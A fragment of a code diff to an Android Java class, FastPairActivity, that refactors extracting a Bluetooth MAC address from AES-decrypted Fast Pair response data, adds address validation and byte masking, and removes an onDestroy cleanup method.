         if (data == null || data.length < 16) return null;
 
-        // Try decrypting with shared secret
         if (sharedSecret != null) {
-            byte[] decrypted = aesDecrypt(sharedSecret, data);
-            if (decrypted != null) {
-                // Response format: type(1) + address(6) + ...
-                if (decrypted[0] == 0x01 && decrypted.length >= 7) {
-                    return formatMac(decrypted, 1);
-                }
+            byte[] dec = aesDecrypt(sharedSecret, data);
+            if (dec != null && dec[0] == 0x01 && dec.length >= 7) {
+                String mac = formatMac(dec, 1);
+                if (isValidMac(mac)) return mac;
             }
         }
 
-        // Try raw extraction at various offsets
         if (data[0] == 0x01 && data.length >= 7) {
-            return formatMac(data, 1);
+            String mac = formatMac(data, 1);
+            if (isValidMac(mac)) return mac;
         }
-
         return null;
+    }
+
+    private static boolean isValidMac(String mac) {
+        return mac != null && !mac.equals("00:00:00:00:00:00") && !mac.equals("FF:FF:FF:FF:FF:FF");
     }
 
     private static String formatMac(byte[] data, int offset) {
         if (offset + 6 > data.length) return null;
         return String.format("%02X:%02X:%02X:%02X:%02X:%02X",
-                data[offset], data[offset + 1], data[offset + 2],
-                data[offset + 3], data[offset + 4], data[offset + 5]);
+                data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF,
+                data[offset + 3] & 0xFF, data[offset + 4] & 0xFF, data[offset + 5] & 0xFF);
     }
 
     private static byte[] aesEncrypt(byte[] key, byte[] data) {
@@ -537,9 +808,7 @@ public class FastPairActivity extends Activity {
             Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
             cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"));
             return cipher.doFinal(data);
-        } catch (Exception e) {
-            return null;
-        }
+        } catch (Exception e) { return null; }
     }
 
     private static byte[] aesDecrypt(byte[] key, byte[] data) {
@@ -549,9 +818,7 @@ public class FastPairActivity extends Activity {
             Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
             cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"));
             return cipher.doFinal(data, 0, 16);
-        } catch (Exception e) {
-            return null;
-        }
+        } catch (Exception e) { return null; }
     }
 
     private static String bytesToHex(byte[] bytes) {
@@ -566,14 +833,5 @@ public class FastPairActivity extends Activity {
             logView.append(msg + "\n");
             scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
         });
-    }
-
-    @Override
-    protected void onDestroy() {
-        super.onDestroy();
-        if (gatt != null) {
-            gatt.close();
-        }
-        try { unregisterReceiver(bondReceiver); } catch (Exception ignored) {}
     }
 }
